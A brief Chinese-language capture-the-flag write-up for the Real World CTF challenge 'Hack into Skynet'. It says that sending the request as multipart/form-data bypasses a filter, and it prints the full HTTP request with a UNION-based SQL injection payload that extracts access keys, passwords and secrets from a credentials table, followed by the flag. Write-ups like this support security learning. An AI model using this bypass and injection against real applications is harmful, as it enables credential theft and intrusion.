# Hack into Skynet

簽到題？我連題目code都沒看，盲戳就拿到flag惹

因為是real world ctf，所以起手式就先踹real world老梗：轉 `multipart/form-data`

然後就繞掉ㄌ(?)

```
POST / HTTP/1.1
Host: 47.242.21.212:8081
Content-Length: 247
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKhkYDh3tENxA2icS
Cookie: SessionId=e8b7fdceddfac5aa6f84044abd832f87
Connection: close

------WebKitFormBoundaryKhkYDh3tENxA2icS
Content-Disposition: form-data; name="name"

'union select access_key,password||':'||secret_key||':'||password from target_credentials limit 1 offset 6
-- -
------WebKitFormBoundaryKhkYDh3tENxA2icS--
```

=>

`rwctf{t0-h4ck-$kynet-0r-f1ask_that-Is-th3-questi0n}`
